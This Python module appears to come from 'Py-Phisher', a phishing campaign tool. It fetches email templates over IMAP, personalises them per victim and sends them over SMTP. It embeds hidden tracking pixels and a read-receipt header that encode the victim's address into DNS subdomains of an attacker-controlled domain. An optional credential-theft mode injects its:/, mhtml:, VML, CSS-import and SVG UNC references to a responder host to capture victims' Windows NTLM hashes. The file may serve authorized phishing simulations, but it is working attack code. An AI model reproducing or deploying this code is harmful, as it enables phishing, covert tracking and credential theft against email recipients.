#!/usr/bin/env python
#coding: utf8
# 
# Py-Phisher - A simple script for basic phishing by https://github.com/1mm0rt41PC
#
# Filename: Mail.py
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; see the file COPYING. If not, write to the
# Free Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
#
from Conf import *;
from time import strftime;
import os,sys,re,socket;
import imaplib;
import getpass;
import hashlib;
import email.utils;
from Utils import hexProtect,urlencode;
import quopri;


class Mail:
	def __init__(self, campaignId, eml=None, getLastTemplate=False, credentialsTheft=False):
		if not eml and os.path.exists(G_Work+'/'+campaignId+'/template.eml'):
			eml = G_Work+'/'+campaignId+'/template.eml';
		if eml and os.path.exists(eml):
			log.info('Using eml file %s', eml);
			eml = open(eml, 'rb').read();
		self._eml = eml;
		self._fromMail = None;
		self._fromName = None;
		self._destMail = None;
		self._destName = None;
		self._httpDomain = None;
		self._userInfo = None;
		self._campaignId = campaignId;
		self._credentialsTheft = credentialsTheft;
		self._getLastTemplate = getLastTemplate;
		log.info('campaignId=%s', self._campaignId);
		if eml:
			log.info('Email template found with the subject "%s"', self.subject());
		
	def getMail(self, login=None, passsword=None):
		log.info('Recv email template for the campagne from IMAP');
		mail = imaplib.IMAP4_SSL('imap-mail.outlook.com');
		if not login:
			try:
				login = raw_input('Login: ');
			except KeyboardInterrupt:
				log.info('Cancel');
				sys.exit(0);
		if not passsword:
			try:
				passsword = getpass.getpass();
			except KeyboardInterrupt:
				log.info('Cancel');
				sys.exit(0);
		rv, data = mail.login(login, passsword)
		rv, data = mail.select('&AMk-l&AOk-ments envoy&AOk-s')
		# Voir
		#    (\HasNoChildren \Sent) "/" "&AMk-l&AOk-ments envoy&AOk-s"
		#    (\HasNoChildren) "/" Sent
		while 1:
			rv, data = mail.search(None, 'ALL');
			log.info('Scanning for a email template (CTRL+c to stop scan)');
			isFound = False;
			try:
				for id in reversed(data[0].split(' ')):
					rv, data = mail.fetch(id, '(BODY.PEEK[HEADER])') # fetch the email body (RFC822) for the given ID
					if '+phishing@' in data[0][1]:
						isFound = True;
						self._eml = data[0][1];
						# On get la pj
						rv, data = mail.fetch(id, '(BODYSTRUCTURE)')
						att = re.findall(r'"application" "msword" \("name" "([^"]+)"', data[0]);
						if att:
							att = att[0];
						else:
							att = None;
						if 'smime.p7' in self._eml:
							print('[%s] %-3s - %s - %s (\033[31;1mEncrypted with s/MIME\033[0m)'%(self.date(), id, self.subject(), att));
						else:
							print('[%s] \033[32;1m%-3s\033[0m - %s - %s'%(self.date(), id, self.subject(), att));
						sys.stdout.flush();
						if self._getLastTemplate:
							self._getLastTemplate = id;
							break;
			except KeyboardInterrupt:
				pass;
			if not isFound:
				raise Exception('No mail found');
			if not self._getLastTemplate:
				id = '';
				try:
					id = raw_input('Whitch template to use ?\n').strip('\r\n\t ');
					if not id:
						raise KeyboardInterrupt();
				except KeyboardInterrupt:
					log.info('Cancel, Exit');
					sys.exit(0);
			log.info('Downloading email id %s...', id);
			rv, data = mail.fetch(id, '(BODY.PEEK[HEADER])') # fetch the email body (RFC822) for the given ID
			rv, data = mail.fetch(id, '(RFC822)') # fetch the email body (RFC822) for the given ID
			self._eml = data[0][1];
			log.info('Email template found with the subject "%s" and attachment "%s"', self.subject(), self.attachment());
			if 'smime.p7' in self._eml:
				log.error('The email "%s" has been signed or encrypted with s/MIME ! Please disable s/MIME', self.subject());
				continue;# loop now
			break;
		mail.close();
		mail.logout();
		if not self._getLastTemplate:
			try:
				raw_input('Confirm or CTRL+c ?\n');
			except KeyboardInterrupt:
				log.info('Cancel');
				sys.exit(0);
		return self;
	def getHeader(self, header):
		return re.sub(r'[\r\n]{1,2}[\t ]+', '', re.findall(header+r':([^\r\n]*([\r\n]{1,2}[\t ]+[^\r\n]+)*)', self._eml)[0][0].strip('\r\n\t '));
	def rmHeader(self, header):
		self._eml = re.sub(header+r':[^\r\n]*([\r\n]{1,2}[\t ]+[^\r\n]+[\r\n]{1,2})*', '', self._eml);
		return self;
	def setHeader(self, header, val):
		self._eml = re.sub(header+r':[^\r\n]*([\r\n]{1,2}[\t ]+[^\r\n]+)*', header+': '+val, self._eml);
		return self;
	def getFrom(self):
		return self.getHeader('From').split('<')[1].split('>')[0];
	def setFrom(self, name, mail):
		self._fromMail = mail;
		self._fromName = name;
		if name == '':
			self.setHeader('From', '<'+mail+'>');
		else:
			self.setHeader('From', '"'+name+'" <'+mail+'>');
		if not self._httpDomain:
			self._httpDomain = mail.split('@')[1];
		return self;
	def setUser(self, userInfo):
		self._userInfo = userInfo;
	def setDest(self, name, mail):
		self._destMail = mail;
		self._destName = name;
		if name == '':
			self.setHeader('To', '<'+mail+'>');
		else:
			self.setHeader('To', '"'+name+'" <'+mail+'>');
		return self;
	def subject(self, subj=''):
		if subj:
			self.setHeader('Subject', subj).setHeader('Thread-Topic', subj)
			return self;
		return self.getHeader('Subject');
	def date(self, update=False):
		if update:
			self.setHeader('Date', email.utils.formatdate())
			return self;
		return self.getHeader('Date');
	def attachment(self, name=None):
		doc = re.findall(r'Content-Type:[\t\r\n ]+application/msword;[\t\r\n ]+name="([^"]+)"', self._eml);
		if doc:
			doc = doc[0];
			if name:
				self._eml.replace(doc, '', self._eml);
				return self;
			return doc;
	@staticmethod
	def _commentTagInRawBody(data, tag):
		data = data.replace('${'+tag+'}', '<!--');
		data = data.replace('${/'+tag+'}', '-->');
		return data;
	@staticmethod
	def _removeTagInRawBody(data, tag):
		data = data.replace('${'+tag+'}', '');
		data = data.replace('${/'+tag+'}', '');
		return data;
	@staticmethod
	def encodeUTF8(data):
		encod = (
			(u'ùûÙÛ', '&ugrave;&ucirc;&Ugrave;&Ucirc;'),
			(u'éèêÉÈÊ', '&eacute;&egrave;&ecirc;&Eacute;&Egrave;&Ecirc;'),
			(u'îïÎÏ', '&icirc;&iuml;&Icirc;&Iuml;'),
			(u'ôÔ', '&ocirc;&Ocirc;'),
			(u'àâÀÂ', '&agrave;&acirc;&Agrave;&Acirc;'),
			(u'çÇ', '&ccedil;&Ccedil;'),
			(u'€', '&euro;'),
		);
		for chars,sep in encod:
			sep = sep.split(';');
			chars = list(chars);
			for i in xrange(0,len(chars)):
				data = data.replace(chars[i], sep[i]+';');
		return data;
	def eml(self):
		self.date(True);
		#En VBA: data = s2h(ActiveDocument.Name & "$" & Environ("userdomain") & "\" & Environ("username") &"$" & getFromO365("EmailAddress"))
		dns_payload = re.sub(r'(.{0,63})(.{0,63})(.{0,63})(.{0,63})', r'\1.\2.\3.\4', (self._campaignId+'$'+self._destMail).encode('hex')).strip('.');
		dns_payload = hexProtect.enc(dns_payload);
		
		trackerId = urlencode(
			hexProtect.enc(
					str(
						str(self._campaignId)+'.'+str(self._userInfo['id'])
					).encode('hex')
				)
			);# http://poney.com/457f00A0
		trackerLink = 'http://'+self._httpDomain+'/'+trackerId;# http://poney.com/457f00A0
		data = re.findall(r'(<html[^²]+</html>)', self._eml)[0];
		data = quopri.decodestring(data).decode('iso-8859-1');
		data = Mail.encodeUTF8(data);
		tmp = re.findall(r'\$[\r\n=]*\{([A-Za-z_0-9=\r\n!]+)\}', data);
		if tmp:
			log.info('Tag found: %s', ', '.join(tmp).strip(', ').replace('\r','\\r').replace('\n','\\n'));
		self.setHeader('Disposition-Notification-To', '"'+self._fromName+'" <pyphisher@open.'+dns_payload+'.'+self._httpDomain+'>')
		data = data.replace('${DOMAIN}',self._httpDomain)
		data = data.replace('${FROM_MAIL}',self._fromMail)
		data = data.replace('${FROM_NAME}',self._fromName)
		data = data.replace('${DEST_MAIL}',self._destMail)
		data = data.replace('${DEST_NAME}',self._destName)
		data = data.replace('${CAMPAIGN_ID}', str(self._campaignId))
		data = data.replace('${USER_ID}', str(self._userInfo['id']))
		data = data.replace('${TRACKER_LINK}', trackerLink)
		data = data.replace('${TRACKER_ID}', trackerId)
		data = data.replace(urlencode('${').lower()+'TRACKER_ID'+urlencode('}').lower(), trackerId)
		data = data.replace(urlencode('${').upper()+'TRACKER_ID'+urlencode('}').upper(), trackerId)
		for i in ['open','vba','link','form']:			
			if not self._userInfo[i]:
				data = Mail._commentTagInRawBody(data, 'STATS_'+i.upper());
				data = Mail._removeTagInRawBody(data, '!STATS_'+i.upper());
			else:
				data = Mail._commentTagInRawBody(data, '!STATS_'+i.upper());
				data = Mail._removeTagInRawBody(data, 'STATS_'+i.upper());
			data = data.replace('${STATS_'+i.upper()+'__DATA}', self._userInfo[i]);
			
		if self._userInfo['open'] or self._userInfo['vba'] or self._userInfo['link'] or self._userInfo['form']:
			data = Mail._commentTagInRawBody(data, 'STATS_VICTIM_SAFE');
			data = Mail._removeTagInRawBody(data, '!STATS_VICTIM_SAFE');
		else:
			data = Mail._commentTagInRawBody(data, '!STATS_VICTIM_SAFE');
			data = Mail._removeTagInRawBody(data, 'STATS_VICTIM_SAFE');

		# On remplace le tag par l'image
		tracker = '<div style="position:absolute;top:-100px;left:-100px;"><span class="show" style="overflow:hidden; float:left; display:none; line-height:0px; width:2px;">\r\n';
		tracker += '<img src="http://open.'+dns_payload+'.'+self._httpDomain+'/'+urlencode(self._campaignId)+'/'+urlencode(self._destMail)+'" width="3" height="2" alt="" style="background:#fff;" />\r\n';
		tracker += '<img src="https://open.'+dns_payload+'.'+self._httpDomain+'/'+urlencode(self._campaignId)+'/'+urlencode(self._destMail)+'" width="3" height="2" alt="" style="background:#fff;" />\r\n';
		tracker += '</div>';
		data = data.replace('${TRACKER_IMG}', tracker)

		if self._credentialsTheft:
			# Ref: https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/
			responderURL = 'ropen.'+dns_payload+'.${TRACKER_TYPE}.responder.'+self._httpDomain;
			def respURL(pType):
				return responderURL.replace('${TRACKER_TYPE}', pType);
			data = re.sub(r'(<body[^>\r\n ]*)', r'\1 background="its:/'+respURL('body')+'/"', data, flags=re.IGNORECASE);
			data = re.sub(r'<head>',
				'\r\n'.join([
					'',
					'<head>',
					'\r\n<base href="//'+respURL('base')+'/base/">',
					'<style>',
					'@import "its:/'+respURL('import1')+'/import1/a.css";',
					'@import "mhtml:its:/'+respURL('import1')+'/import1/a.css";',
					'@import "mk:@MSITStore:/'+respURL('import1')+'/import1/a.css";',
					'@import url(its:/'+respURL('import2')+'/import2/a.css);',
					'@import url(mhtml:its:/'+respURL('import2')+'/import2/a.css);',
					'@import url(mk:@MSITStore:/'+respURL('import2')+'/import2/a.css);',
					'</style>',
					'<link rel="stylesheet" href="its:/'+respURL('linkstylesheet')+'/link/a.css" />',
					'<link rel="stylesheet" href="mhtml:its:/'+respURL('linkstylesheet')+'/link/a.css" />',
					'<link rel="stylesheet" href="mk:@MSITStore:/'+respURL('linkstylesheet')+'/link/a.css" />',
				]),
				data, flags=re.IGNORECASE
			);
			data = re.sub(r'</body>',
				'\r\n'.join([
					'<div style="position:absolute;top:-100px;left:-100px;"><span class="show" style="overflow:hidden; float:left; display:none; line-height:0px; width:2px;"><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />',
						'<img src="//'+respURL('img')+'/img/a.png" style="width:2px;height:3px; background:#fff;">',
						'<input type="image" src="its:/'+respURL('input')+'/input/a.png" name="id" value=" " style="width:2px;height:3px;background:#fff;">',
						'<input type="image" src="mhtml:its:/'+respURL('input')+'/input/a.png" name="id" value=" " style="width:2px;height:3px;background:#fff;">',
						'<input type="image" src="mk:@MSITStore:/'+respURL('input')+'/input/a.png" name="id" value=" " style="width:2px;height:3px;background:#fff;">',
						'<v:background xmlns:v="urn:schemas-microsoft-com:vml" style="width:2px;height:3px;background:#fff;">'.strip('\r\n\t '),
							'<v:fill src="its:/'+respURL('vml')+'/vml/a.svg" />',
							'<v:fill src="mhtml:its:/'+respURL('vml')+'/vml/a.svg" />',
							'<v:fill src="mk:@MSITStore:/'+respURL('vml')+'/vml/a.svg" />',
						'</v:background>',
						# Here is a method posted by @fridgehead for SVG loading in Chrome, IE and Edge.
						'<svg width="1cm" height="1cm" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink= "http://www.w3.org/1999/xlink">',
							r'<image height="1" width="1" xlink:href="\\'+respURL('svg')+r'\share\evil.xzy" />',
						'</svg>',
						'</span></div>',
					'</body>'
				]),
				data, flags=re.IGNORECASE
			);
		
		tmp = re.findall(r'\$[\r\n=]*\{([A-Za-z_0-9=\r\n!]+)\}', data);
		if tmp:
			log.critical('TAG unknown %s'%('\n'.join(tmp)));
			sys.exit(2);
		data = quopri.encodestring(data.strip('\r\n\t '));
		data = re.sub(r'<html[^²]+</html>', data, self._eml);
		if '--debugEml' in sys.argv:
			with open('/tmp/'+self._userInfo['email']+'.'+str(self._campaignId)+'.eml','wb') as fp:
				fp.write(data);
		return data;
	@staticmethod
	def _recv(sock, expectedCode):
		buff = '';
		while '\n' not in buff:
			tmp = sock.recv(30);
			if not tmp:
				raise Exception('Connection lost');
			buff += tmp;
		if str(expectedCode) not in buff:
			raise Exception('Server error: '+buff);
		log.debug('SMTP say: %s', buff.strip('\r\n\t '));
	@staticmethod
	def _send(sock, cmd, expectedCode):
		log.debug('SMTP rcv: %s', cmd);
		sock.sendall(cmd+'\r\n');
		Mail._recv(sock, expectedCode);		
	def send(self):
		try:
			log.info('Connecting to SMTP...');
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
			s.connect(('127.0.0.1',25));
			Mail._recv(s, 220);
			Mail._send(s, 'HELO phisher', 250);
			Mail._send(s, 'MAIL FROM: %s'%(self._fromMail), 250);
			Mail._send(s, 'RCPT TO: %s'%(self._destMail), 250);
			Mail._send(s, 'DATA', 354);
			data = self.eml();
			if log.isEnabledFor(logging.DEBUG):
				log.debug('Sending email to %s from %s with the SMTP commands\n%s', self._destMail, self._fromMail, data);
			else:
				log.info('Sending email to %s from %s...', self._destMail, self._fromMail);
			s.send(data);
			Mail._send(s, '\r\n.', 250);
			Mail._send(s, 'RSET', 250);
			Mail._send(s, 'QUIT', 221);
			s.close();
			log.info('Message sent to %s', self._destMail);
		except Exception as e:
			log.critical(str(e), exc_info=e);
		return self;
	def saveEML(self, filename):
		log.info('Saving EML in %s', filename);
		with open(filename, 'wb') as fp:
			fp.write(self._eml);
			log.info('EML saved');
		return self;